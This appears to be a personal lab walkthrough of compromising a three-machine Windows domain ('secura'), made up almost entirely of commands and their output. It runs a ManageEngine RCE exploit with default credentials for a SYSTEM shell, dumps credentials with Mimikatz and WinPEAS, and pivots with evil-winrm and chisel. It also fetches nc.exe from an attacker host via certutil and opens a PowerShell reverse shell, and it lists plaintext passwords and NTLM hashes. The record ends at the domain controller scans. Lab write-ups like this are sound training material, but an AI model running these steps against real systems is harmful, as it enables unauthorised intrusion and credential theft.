Three-machine enterprise environment

## Objectives
- Exploit vulnerabilities in ManageEngine
- Pivot through internal services
- Leverage insecure GPO permissions to escalate privileges
- Compromise the domain

# Domain
- dc01

**Name**
- secura.yzx

**Users:Passwords**
- charlotte : Game2On4.!
- michael                                         <- Likely rabbit hole
- administrator : Almost4There8.?
	- NTLM     :faf613cedb73980bbd34e0a5514df813
- Administrator - 95
	- NTLM     : a51493b0b06e5e35f855245e71af1d14
	- SHA1     : 02fb73dd0516da435ac4681bda9cbed3c128e1aa
         * Username : apache
         * Domain   : era.secura.local
         * Password : New2Era4.!
	- Winpeas
		- DefaultUserName              :  administrator
		- DefaultPassword               :  Reality2Show4!.?

# 192.168.x.95

**proof.txt** - b0624467dd801d947277061ea5e6bb70

## Methodology:
- Discovered website (`44444/HTTP`, `8443/HTTPS`) with Nmap scan
- Manage Engine's Applications Manager v.14710 w/ manual browsing
- Online search shows working default creds `admin:admin`
	- Fuzzing seems like rabbit hole
- Searchsploit shows RCE exploit `48793.py` 
- Gain reverse shell on 95 as NT AUTH/SYSTEM
- Enumeration:
	- net use - Users: `charlotte`, `michael`
	- WinPEAS - Auto-login creds: `administrator:Reality2Show4!.?`
	- Mimikatz - `sekurlsa::logonpasswords`
		- Admin's NTLM: a51493b0b06e5e35f855245e71af1d14
		- Username : `apache`
		- Domain   : `era.secura.local`
		- Password : `New2Era4.!`
- Attack attempt:
	- Notice `winrm` on port `47001` is open
		- evil-winrm for foothold on x.96


## Nmap Scan

#### Open Ports
```bash
nmap -v -p- --max-scan-delay=0 -oN 95/all_ports.txt 192.168.184.95
	PORT      STATE SERVICE
	135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5001/tcp  open  commplex-link
5040/tcp  open  unknown
5985/tcp  open  wsman
7680/tcp  open  pando-pub
8443/tcp  open  https-alt
12000/tcp open  cce4x
44444/tcp open  cognex-dataman
47001/tcp open  winrm
49161/tcp open  unknown
49162/tcp open  unknown
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49682/tcp open  unknown
49687/tcp open  unknown
49704/tcp open  unknown
57372/tcp open  unknown
57398/tcp open  unknown
```

#### Version & Default Scripts
```bash
nmap -v -sV -sC -p 135,139,445,5001,5040,5985,8443,12000,44444,47001,49664-49672,54233,54234,57499,57528 -oN 95/open_sVsC.txt 192.168.184.95

	PORT      STATE SERVICE         VERSION
	135/tcp   open  msrpc           Microsoft Windows RPC
	139/tcp   open  netbios-ssn     Microsoft Windows netbios-ssn
	445/tcp   open  microsoft-ds?
	5001/tcp  open  commplex-link?
	| fingerprint-strings: 
	|   SIPOptions: 
	|     HTTP/1.1 200 OK
	|     Content-Type: text/html; charset=ISO-8859-1
	|     Content-Length: 132
	|_    MAINSERVER_RESPONSE:<serverinfo method="setserverinfo" mainserver="5001" webserver="44444" pxyname="192.168.45.151" startpage=""/>
	5040/tcp  open  unknown
	5985/tcp  open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	|_http-title: Not Found
	|_http-server-header: Microsoft-HTTPAPI/2.0
	8443/tcp  open  ssl/https-alt   AppManager
	|_ssl-date: 2024-10-04T21:10:47+00:00; +23s from scanner time.
	| http-methods: 
	|_  Supported Methods: GET POST
	|     ...
	|_http-server-header: AppManager
	| fingerprint-strings: 
	|   FourOhFourRequest: 
	|     HTTP/1.1 404 
	|     Set-Cookie: JSESSIONID_APM_44444=D241E712005F1007093B06D49B69E9E7; Path=/; Secure; HttpOnly
	|     ...
	|   GetRequest: 
	|     HTTP/1.1 200 
	|     Set-Cookie: JSESSIONID_APM_44444=BFF7138A476CEFB2A186528223679C18; Path=/; Secure; HttpOnly
	|     ...
	|   HTTPOptions: 
	|     HTTP/1.1 403 
	|     Set-Cookie: JSESSIONID_APM_44444=12DFCD8A8B51EC270867F1E23B775B74; Path=/; Secure; HttpOnly    # NOTE -> Follows info we get for port 44444
	|     ...
	12000/tcp open  cce4x?
	44444/tcp open  cognex-dataman?
	| fingerprint-strings: 
	|   GetRequest: 
	|     HTTP/1.1 200 
	|     Set-Cookie: JSESSIONID_APM_44444=269CC0F0F745522FEB8406F313710AC3; Path=/; HttpOnly
	|     ...
	|     Server: AppManager
	|   ...
	|   RTSPRequest: 
	|     HTTP/1.1 505 
	|     vary: accept-encoding
	|     Content-Type: text/html;charset=utf-8
	|     Content-Language: en
	|     Content-Length: 2142
	|     Date: Fri, 04 Oct 2024 21:06:58 GMT
	|     Server: AppManager
	|     ...
	47001/tcp open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	|_http-server-header: Microsoft-HTTPAPI/2.0
	|_http-title: Not Found
	49664/tcp open  msrpc           Microsoft Windows RPC
	...
	49671/tcp open  msrpc           Microsoft Windows RPC
	49672/tcp open  tcpwrapped
	54233/tcp open  unknown
	| fingerprint-strings: 
	|   SMBProgNeg, X11Probe: 
	|_    CLOSE_SESSION
	54234/tcp open  unknown
	| fingerprint-strings: 
	|   SMBProgNeg, X11Probe: 
	|_    CLOSE_SESSION
	57499/tcp open  java-rmi        Java RMI
	57528/tcp open  unknown
	
	==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
	...
	
	Host script results:
	|_clock-skew: mean: 23s, deviation: 0s, median: 22s
	| smb2-security-mode: 
	|   3:1:1: 
	|_    Message signing enabled but not required
	| smb2-time: 
	|   date: 2024-10-04T21:09:28
	|_  start_date: N/A
```


## Site

![](SECURA_95_site.png)

- Fuzzed - Nothing actionable
```bash
ffuf -u http://192.168.184.95:44444/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -o ffuf_44444.txt
```

- Default creds `admin:admin` work
![](SECURA_95_site_about.png)

- Searchsploit
```bash
searchsploit manage engine application manager 14
	---------------------------------------------------------------------------------------- ---------------------------------
	 Exploit Title                                                                          |  Path
	---------------------------------------------------------------------------------------- ---------------------------------
	...
	ManageEngine Applications Manager 14700 - Remote Code Execution (Authenticated)         | java/webapps/48793.py
	...
	---------------------------------------------------------------------------------------- ---------------------------------
	Shellcodes: No Results
	Papers: No Results
```


## Reverse Shell

- Using 48793.py
```bash
# Exploit won't work on jdk 7 - update jdk to 8
sudo apt update && sudo apt install default-jdk
sed -i 's/release 7/release 8/g' 48793.py

# Run
python3 48793.py http://192.168.184.95:44444 admin admin 192.168.45.201 5555 
	[*] Visiting page to retrieve initial cookies...
	[*] Retrieving admin cookie...
	[*] Getting base directory of ManageEngine...
	[*] Found base directory: C:\Program Files\ManageEngine\AppManager14
	[*] Creating JAR file...
	Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
	warning: [options] source value 8 is obsolete and will be removed in a future release
	warning: [options] target value 8 is obsolete and will be removed in a future release
	warning: [options] To suppress warnings about obsolete options, use -Xlint:-options.
	3 warnings
	Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
	added manifest
	adding: weblogic/jndi/Environment.class(in = 1844) (out= 1098)(deflated 40%)
	[*] Uploading JAR file...
	[*] Attempting to upload JAR directly to targeted Weblogic folder...
	[!] Failed to upload JAR directly, continue to add and execute job to move JAR...
	[*] Creating a task to move the JAR file to relative path: classes/weblogic/version8/...
	[*] Found actionname: move_weblogic_jar3864 with found actionid 10000003
	[*] Executing created task with id: 10000003 to copy JAR...
	[*] Task 10000003 has been executed successfully
	[*] Deleting created task as JAR has been copied...
	[*] Running the Weblogic credentialtest which triggers the code in the JAR...
	[*] Check your shell...
```
	- Got a shell.   NOTE:  Attack didn't work initially. Had to apply jdk fix to kali and revert machine

```powershell
whoami
	nt authority\system

cd C:\

dir /s proof.txt
	Volume in drive C has no label.
	 Volume Serial Number is A878-B85B
	
	 Directory of C:\Users\Administrator\Desktop
	
	10/09/2024  09:40 PM                34 proof.txt
	               1 File(s)             34 bytes
	
	     Total Files Listed:
	               1 File(s)             34 bytes
	               0 Dir(s)  16,780,812,288 bytes free

type c:\users\administrator\desktop\proof.txt
	b0624467dd801d947277061ea5e6bb70
```

## Further enumeration

- Default web working directory
```powershell
dir
 Directory of 
 \working
	...
	08/03/2022  10:15 PM                 0 adtappmanager.txt
	08/03/2022  10:17 PM                 0 am.lock
	06/08/2020  01:12 PM    <DIR>          apache
	...
	06/08/2020  01:09 PM           622,360 wrapper.exe


type mysql\my.ini
	#default password for MySQL
	password=appmanager
```

- Look for interesting files in user's path
```powershell
Get-ChildItem -Path . -Include *.txt,*.doc,*.docx,*.xls,*.xlsx,*.pdf,*.db,*.ini -Recurse -ErrorAction SilentlyContinue -Force -Exclude desktop.ini
...

	Directory: C:\Users\Administrator\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/9/2022   3:49 AM         307015 english_wikipedia.txt
-a----          3/9/2022   3:49 AM          30420 female_names.txt
-a----          3/9/2022   3:49 AM           7656 male_names.txt
-a----          3/9/2022   3:49 AM         271951 passwords.txt                   # NOTE
-a----          3/9/2022   3:49 AM          86077 surnames.txt
-a----          3/9/2022   3:49 AM         183450 us_tv_and_film.txt

...
    Directory: C:\Users\Administrator\Desktop
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/10/2024   8:44 PM             34 proof.txt


# App Manager logs
more "C:\Program Files\ManageEngine\AppManager14\logs\actions.txt"
	Product = Applications Manager 14 (Build 14710)
          Service Pack Version =NONE
          os name=Windows 10
          os version=10.0
          os architecture=amd64
          java version=1.8.0_202
          java vendor=Oracle Corporation
          java specification=Java Platform API Specification
          java specification version=1.8
          java vm name=Java HotSpot(TM) 64-Bit Server VM
          java vm information =mixed mode
          java compiler=null
          ********************************************************
         -------RDBMS related information------
          database product name = PostgreSQL
          database product version=9.2.4                                           # -> NOTE
          database driver name=PostgreSQL Native Driver
          database driver version=PostgreSQL 9.0 JDBC3 (build 801)
          database user name=postgres
          database URL=jdbc:postgresql://localhost:15432/amdb?dontTrackOpenResources=true&useUnicode=true&characterEncoding=UTF-8


more "C:\Program Files\ManageEngine\AppManager14\working\html\Help.txt"
	The MIB browser applet allows you to load and browse multiple MIB modules and view data 
	on an SNMP agent.  You can also view real-time graphs, and tables, of SNMP data.
	
	Version 1.1 includes a number of enhancements, including an SNMP walk capability,


BlackListCommands.properties
more "C:\Program Files\ManageEngine\AppManager14\conf\BlackListCommands.properties"
	#$Id$
	# Below are the blacklisted commands, that are not allowed for the Execute Program Action
	
	linux_commands=chmod,crontab,netstat,rm,chattr
	windows_commands=del,deltree,netstat
	# Below is the regex which we are using to validate the name like User Name.
	am.name.validation.regex=[^/\\:;|\\[\\]=,*?<>\"`%\'^]+
```

- Domain Users
```powershell
net user /domain
	The request will be processed at a domain controller for domain secura.yzx.
	
	User accounts for \\dc01.secura.yzx
	-------------------------------------------------------------------------------
	Administrator            charlotte                DefaultAccount           
	Guest                    krbtgt                   michael                  
	The command completed with one or more errors.


net user charlotte /domain
	The request will be processed at a domain controller for domain secura.yzx.
	
	User name                    charlotte
	Full Name                    charlotte
	Comment                      
	User's comment               
	Country/region code          000 (System Default)
	Account active               Yes
	Account expires              Never
	
	Password last set            8/5/2022 6:37:50 PM
	Password expires             Never
	Password changeable          8/6/2022 6:37:50 PM
	Password required            Yes
	User may change password     Yes
	
	Workstations allowed         All
	Logon script                 
	User profile                 
	Home directory               
	Last logon                   Never
	
	Logon hours allowed          All
	
	Local Group Memberships      *Remote Management Use
	Global Group memberships     *Domain Users         
	The command completed successfully.


net user michael /domain
	The request will be processed at a domain controller for domain secura.yzx.
	
	User name                    michael
	Full Name                    michael
	Comment                      
	User's comment               
	Country/region code          000 (System Default)
	Account active               Yes
	Account expires              Never
	
	Password last set            8/5/2022 6:36:23 PM
	Password expires             Never
	Password changeable          8/6/2022 6:36:23 PM
	Password required            Yes
	User may change password     Yes
	
	Workstations allowed         All
	Logon script                 
	User profile                 
	Home directory               
	Last logon                   Never
	
	Logon hours allowed          All
	
	Local Group Memberships      
	Global Group memberships     *Domain Users         
	The command completed successfully.
```


- Domain Groups
```powershell
net group /domain
	The request will be processed at a domain controller for domain secura.yzx.
	
	Group Accounts for \\dc01.secura.yzx
	-------------------------------------------------------------------------------
	*Cloneable Domain Controllers
	*DnsUpdateProxy
	*Domain Admins
	*Domain Computers
	*Domain Controllers
	*Domain Guests
	*Domain Users
	*Enterprise Admins
	*Enterprise Key Admins
	*Enterprise Read-only Domain Controllers
	*Group Policy Creator Owners
	*Key Admins
	*Protected Users
	*Read-only Domain Controllers
	*Schema Admins
	The command completed with one or more errors.
```


- Domain Shares
```powershell
net view \\dc01 /all
	Shared resources at \\dc01
	
	Share name  Type  Used as  Comment              
	-------------------------------------------------------------------------------
	ADMIN$      Disk           Remote Admin         
	C$          Disk           Default share        
	IPC$        IPC            Remote IPC           
	NETLOGON    Disk           Logon server share   
	SYSVOL      Disk           Logon server share   
	test        Disk                                
	The command completed successfully.
```
	- `dc01` was discovered during nmap -sV scan of .97


## Mimikatz

- Dump of creds
```powershell
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 301541 (00000000:000499e5)
Session           : Interactive from 1
User Name         : Administrator
Domain            : SECURE
Logon Server      : SECURE
Logon Time        : 9/28/2024 1:25:49 AM
SID               : S-1-5-21-3197578891-1085383791-1901100223-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : SECURE
         * NTLM     : a51493b0b06e5e35f855245e71af1d14
         * SHA1     : 02fb73dd0516da435ac4681bda9cbed3c128e1aa
		...
         * Username : apache
         * Domain   : era.secura.local
         * Password : New2Era4.!
        cloudap :
```

## WinPEAS

```powershell
����������͹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultUserName               :  administrator
    DefaultPassword               :  Reality2Show4!.?
```

## Laterally move to x.96
```powershell
# In Kali
evil-winrm -i 192.168.226.96 -u apache -p "New2Era4.\!"

	Evil-WinRM shell v3.5
	
	Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
	
	Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
	
	Info: Establishing connection to remote endpoint
	*Evil-WinRM* PS C:\Users\apache.ERA\Documents> whoami
	era\apache
	*Evil-WinRM* PS C:\Users\apache.ERA\Documents> hostname
	era
	*Evil-WinRM* PS C:\Users\apache.ERA\Documents> ipconfig
	
	Windows IP Configuration
	
	
	Ethernet adapter Ethernet0:
	
	   Connection-specific DNS Suffix  . :
	   IPv4 Address. . . . . . . . . . . : 192.168.226.96
	   Subnet Mask . . . . . . . . . . . : 255.255.255.0
	   Default Gateway . . . . . . . . . : 192.168.226.254
```




# 192.168.x.96
- aka ERA

- local.txt - 8ec436f8a9df6984f440e9066ed80b08
- proof.txt - e2587c78dce7bac15681d482ebec9a19

## Methodology:
- Discover `mysql` via nmap scan
	- `-sCV` shows our kali isn't allowed to connect
- Use `chisel` on 96 to create a tunnel loop to connect to MariaDB
- Dump db for `Admin` and `charlotte` creds
- Login via `evil-winrm` as `admin` & upgrade shell w/ `nc.exe`
- Search for flags (Will need `-Force` as they're hidden)
- Network Service attack w/ found creds against .97 shows `charlotte` can access SMB on all endpoints
- Run WinPEASE & Mimikatz


## Nmap Scan

#### Open Ports
```bash
nmap -v -p- --max-scan-delay=0 -oN 96/all_ports.txt 192.168.184.96
	PORT      STATE SERVICE
	135/tcp   open  msrpc
	139/tcp   open  netbios-ssn
	445/tcp   open  microsoft-ds
	3306/tcp  open  mysql
	5040/tcp  open  unknown
	5985/tcp  open  wsman
	7680/tcp  open  pando-pub
	47001/tcp open  winrm
	49664/tcp open  unknown
	49665/tcp open  unknown
	49666/tcp open  unknown
	49667/tcp open  unknown
	49668/tcp open  unknown
	49669/tcp open  unknown
	49670/tcp open  unknown
	49671/tcp open  unknown
```

#### Version & Default Scripts
```bash
nmap -v -sV -sC 192.168.184.96 -p 135,139,445,3306,5040,5985,7680,47001,49664-49671 -oN open_sVsC.txt  
	PORT      STATE SERVICE       VERSION
	135/tcp   open  msrpc         Microsoft Windows RPC
	139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
	445/tcp   open  microsoft-ds?
	3306/tcp  open  mysql?
	| fingerprint-strings: 
	|   NotesRPC: 
	|_    Host '192.168.45.201' is not allowed to connect to this MariaDB server
	5040/tcp  open  unknown
	5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	|_http-title: Not Found
	|_http-server-header: Microsoft-HTTPAPI/2.0
	7680/tcp  open  pando-pub?
	47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	|_http-title: Not Found
	|_http-server-header: Microsoft-HTTPAPI/2.0
	49664/tcp open  msrpc         Microsoft Windows RPC
	49665/tcp open  msrpc         Microsoft Windows RPC
	49666/tcp open  msrpc         Microsoft Windows RPC
	49667/tcp open  msrpc         Microsoft Windows RPC
	49668/tcp open  msrpc         Microsoft Windows RPC
	49669/tcp open  msrpc         Microsoft Windows RPC
	49670/tcp open  msrpc         Microsoft Windows RPC
	49671/tcp open  msrpc         Microsoft Windows RPC
	1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
	SF-Port3306-TCP:V=7.94SVN%I=7%D=10/9%Time=6706FF5E%P=x86_64-pc-linux-gnu%r
	SF:(NotesRPC,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.201'\x20is\x20no
	SF:t\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
	Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
	
	Host script results:
	| smb2-security-mode: 
	|   3:1:1: 
	|_    Message signing enabled but not required
	|_clock-skew: 27s
	| smb2-time: 
	|   date: 2024-10-09T22:13:31
	|_  start_date: N/A
	
	NSE: Script Post-scanning.
	Initiating NSE at 18:13
	Completed NSE at 18:13, 0.00s elapsed
	Initiating NSE at 18:13
	Completed NSE at 18:13, 0.00s elapsed
	Initiating NSE at 18:13
	Completed NSE at 18:13, 0.00s elapsed
	Read data files from: /usr/bin/../share/nmap
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 175.37 seconds
```

## Foothold
```bash
# Initial
evil-winrm -i 192.168.226.96 -u apache -p "New2Era4.\!"
```

```powershell
# Upgrading
certutil.exe -urlcache -f http://192.168.45.224:8080/nc.exe

.\nc.exe 192.168.45.224 6666 -e powershell.exe
```

## Tunneling to access MySQL DB
```bash
# Set up tunnel w/ chisel in Kali
./chisel server -p 8000 --reverse
	2024/10/25 15:09:20 server: Reverse tunnelling enabled
	2024/10/25 15:09:20 server: Fingerprint ER8rRFL8yr1lmK1BBUWTlsON3MBMVTGczmoO1J0L6pc=
	2024/10/25 15:09:20 server: Listening on http://0.0.0.0:8000
	2024/10/25 15:15:05 server: session#1: tun: proxy#R:3306=>3306: Listening
```

```powershell
# In shell_96
.\chisel.exe client 192.168.45.224:8000 R:3306:127.0.0.1:3306
	chisel.exe : 2024/10/25 19:15:36 client: Connecting to ws://192.168.45.224:8000
	    + CategoryInfo          : NotSpecified: (2024/10/25 19:1...168.45.224:8000:String) [], RemoteException
	    + FullyQualifiedErrorId : NativeCommandError
	2024/10/25 19:15:36 client: Connected (Latency 62.6283ms)
```
	- NOTE:  Using a tunnel on 96 itself.   No need to attempt to tunnel through 95 - will NOT work

```bash
# Access mysql db
mysql -u root -h 127.0.0.1 --skip-ssl               
	Welcome to the MariaDB monitor.  Commands end with ; or \g.
	Your MariaDB connection id is 8
	Server version: 10.4.19-MariaDB mariadb.org binary distribution
	
	Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
	
	Support MariaDB developers by giving a star at https://github.com/MariaDB/server
	Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
	
	MariaDB [(none)]> show databases;
		+--------------------+
		| Database           |
		+--------------------+
		| creds              |
		| information_schema |
		| mysql              |
		| performance_schema |
		| phpmyadmin         |
		| test               |
		+--------------------+
		
	MariaDB [(none)]> show tables from creds;
		+-----------------+
		| Tables_in_creds |
		+-----------------+
		| creds           |
		+-----------------+
		
	MariaDB [(none)]> use creds;
		Reading table information for completion of table and column names
		You can turn off this feature to get a quicker startup with -A
		
		Database changed
	MariaDB [creds]> select * from creds;
		+---------------+-----------------+
		| name          | pass            |
		+---------------+-----------------+
		| administrator | Almost4There8.? |
		| charlotte     | Game2On4.!      |
		+---------------+-----------------+

```

## evil-WinRM as Admin
```powershell
evil-winrm -i 192.168.224.96 -u administrator -p "Almost4There8.?"
	...
	*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-ChildItem -Path C:\users -Include proof.txt,local.txt -Recurse -ErrorAction SilentlyContinue -Force
		    Directory: C:\users\Administrator\Desktop
		
		
		Mode                 LastWriteTime         Length Name
		----                 -------------         ------ ----
		-a----        10/25/2024   6:58 PM             34 proof.txt
		
		
		    Directory: C:\users\apache\Desktop
		
		
		Mode                 LastWriteTime         Length Name
		----                 -------------         ------ ----
		-a----        10/25/2024   6:58 PM             34 local.txt
	*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\users\administrator\desktop\proof.txt -force
		e2587c78dce7bac15681d482ebec9a19
	*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\users\apache\desktop\local.txt -force
		8ec436f8a9df6984f440e9066ed80b08
```

## Network Services
```bash
nxc smb 192.168.224.95-97 -u charlotte -p Game2On4.! -d secura.yzx             
	SMB         192.168.224.97  445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:secura.yzx) (signing:True) (SMBv1:True)
	SMB         192.168.224.95  445    SECURE           [*] Windows 10 / Server 2019 Build 19041 x64 (name:SECURE) (domain:secura.yzx) (signing:False) (SMBv1:False)
	SMB         192.168.224.96  445    ERA              [*] Windows 10 / Server 2019 Build 19041 x64 (name:ERA) (domain:secura.yzx) (signing:False) (SMBv1:False)
	SMB         192.168.224.97  445    DC01             [+] secura.yzx\charlotte:Game2On4.! 
	SMB         192.168.224.95  445    SECURE           [+] secura.yzx\charlotte:Game2On4.! 
	SMB         192.168.224.96  445    ERA              [+] secura.yzx\charlotte:Game2On4.! 
	Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

nxc ldap 192.168.224.97 -u users.txt -p pws.txt -d secura.yzx
	SMB         192.168.224.97  445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:secura.yzx) (signing:True) (SMBv1:True)
	LDAP        192.168.224.97  389    DC01             [-] secura.yzx\charlotte:New2Era4.! 
	LDAP        192.168.224.97  389    DC01             [-] secura.yzx\michael:New2Era4.! 
	LDAP        192.168.224.97  389    DC01             [-] secura.yzx\administrator:New2Era4.! 
	LDAP        192.168.224.97  389    DC01             [-] secura.yzx\apache:New2Era4.! 
	LDAP        192.168.224.97  389    DC01             [-] secura.yzx\charlotte:Reality2Show4!.? 
	LDAP        192.168.224.97  389    DC01             [-] secura.yzx\michael:Reality2Show4!.? 
	LDAP        192.168.224.97  389    DC01             [-] secura.yzx\administrator:Reality2Show4!.? 
	LDAP        192.168.224.97  389    DC01             [-] secura.yzx\apache:Reality2Show4!.? 
	LDAP        192.168.224.97  389    DC01             [+] secura.yzx\charlotte:Game2On4.!
```

## WinPEAS

```powershell
ÉÍÍÍÍÍÍÍÍÍÍ¹ Cached Creds
È If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#cached-credentials
    cachedlogonscount is 10

...
ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating PowerShell Session Settings using the registry
    Name                                   Microsoft.PowerShell
      BUILTIN\Administrators               AccessAllowed
      NT AUTHORITY\INTERACTIVE             AccessAllowed
      BUILTIN\Remote Management Users      AccessAllowed
   =================================================================================================

ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Services Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
  [X] Exception: Cannot open Service Control Manager on computer '.'. This operation might require other privileges.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Interesting Services -non Microsoft-

    Apache Server(Apache Software Foundation - Apache Server)["C:\xampp\apache\bin\httpd.exe" -k runservice] - Autoload
    File Permissions: Authenticated Users [WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\xampp\apache\bin (Authenticated Users [WriteData/CreateFiles])
    Apache/2.4.48 (Win64)
...
   =================================================================================================

    MySQL(MySQL)[C:\xampp\mysql\bin\mysqld.exe MySQL] - Autoload - No quotes and Space detected
    File Permissions: Authenticated Users [WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\xampp\mysql\bin (Authenticated Users [WriteData/CreateFiles])
   =================================================================================================
...
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for possible password files in users homes
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
    C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
...
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found Apache-Nginx Files
File: C:\xampp\php\php.ini
...
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found PHP Sessions Files
File: C:\xampp\tmp\sess_slj10ssu5745kcivardthqb5rg
File: C:\xampp\tmp\sess_4ratl05q4mpc92ib7bga2imgr9

ÉÍÍÍÍÍÍÍÍÍÍ¹ Found PHP_files Files
File: C:\xampp\phpMyAdmin\setup\config.php                                                                            # NOTE
...
File: C:\xampp\phpMyAdmin\vendor\symfony\config\ConfigCache.php
...
File: C:\xampp\phpMyAdmin\vendor\symfony\dependency-injection\Compiler\PassConfig.php                                 # NOTE
File: C:\xampp\phpMyAdmin\vendor\symfony\dependency-injection\Compiler\MergeExtensionConfigurationPass.php
File: C:\xampp\phpMyAdmin\config.inc.php                                                                              # NOTE
...

ÉÍÍÍÍÍÍÍÍÍÍ¹ Found Moodle Files
File: C:\xampp\phpMyAdmin\libraries\classes\Config.php
File: C:\xampp\phpMyAdmin\setup\config.php
File: C:\xampp\php\pear\PEAR\Command\Config.php
File: C:\xampp\php\pear\PEAR\Config.php

ÉÍÍÍÍÍÍÍÍÍÍ¹ Found Tomcat Files
File: C:\xampp\tomcat\conf\tomcat-users.xml
```


## Laterally Move to 97
```bash
evil-winrm -i 192.168.224.97 -u charlotte -p "Game2On4.\!"                          
	Evil-WinRM shell v3.5
	Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
	Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
	Info: Establishing connection to remote endpoint
	*Evil-WinRM* PS C:\Users\TEMP\Documents> 
```


# 192.168.x.97

Domain: secura.yzx

- local.txt - f6754be5e8504176521ffe674fdf1691
- proof.txt - 736f8124f726f6af42e79af1170faa4c

#### Open Ports
```bash
nmap -v -p- -Pn --max-scan-delay=0 -oN 97/all_ports.txt 192.168.184.97
	PORT      STATE SERVICE
	53/tcp    open  domain
	88/tcp    open  kerberos-sec
	135/tcp   open  msrpc
	139/tcp   open  netbios-ssn
	389/tcp   open  ldap
	445/tcp   open  microsoft-ds
	464/tcp   open  kpasswd5
	593/tcp   open  http-rpc-epmap
	636/tcp   open  ldapssl
	3268/tcp  open  globalcatLDAP
	3269/tcp  open  globalcatLDAPssl
	5985/tcp  open  wsman
	9389/tcp  open  adws
	49665/tcp open  unknown
	49666/tcp open  unknown
	49668/tcp open  unknown
	49677/tcp open  unknown
	49678/tcp open  unknown
	49681/tcp open  unknown
	49708/tcp open  unknown
	49814/tcp open  unknown
```

#### Version & Default Scripts
```bash
nmap -Pn -sV -sC -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49665,49666,49668,49677,49678,49681,49708,49814 -oN 97/open_sVsC.txt 192.168.184.97
	PORT      STATE SERVICE      VERSION
	53/tcp    open  domain       Simple DNS Plus
	88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-10-04 21:11:46Z)
	135/tcp   open  msrpc        Microsoft Windows RPC
	139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
	389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: secura.yzx, Site: Default-First-Site-Name)
	445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: SECURA)
	464/tcp   open  kpasswd5?
	593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
	636/tcp   open  tcpwrapped
	3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: secura.yzx, Site: Default-First-Site-Name)
	3269/tcp  open  tcpwrapped
	5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	|_http-server-header: Microsoft-HTTPAPI/2.0
	|_http-title: Not Found
	9389/tcp  open  mc-nmf       .NET Message Framing
	49665/tcp open  msrpc        Microsoft Windows RPC
	49666/tcp open  msrpc        Microsoft Windows RPC
	49668/tcp open  msrpc        Microsoft Windows RPC
	49677/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
	49678/tcp open  msrpc        Microsoft Windows RPC
	49681/tcp open  msrpc        Microsoft Windows RPC
	49708/tcp open  msrpc        Microsoft Windows RPC
	49814/tcp open  msrpc        Microsoft Windows RPC
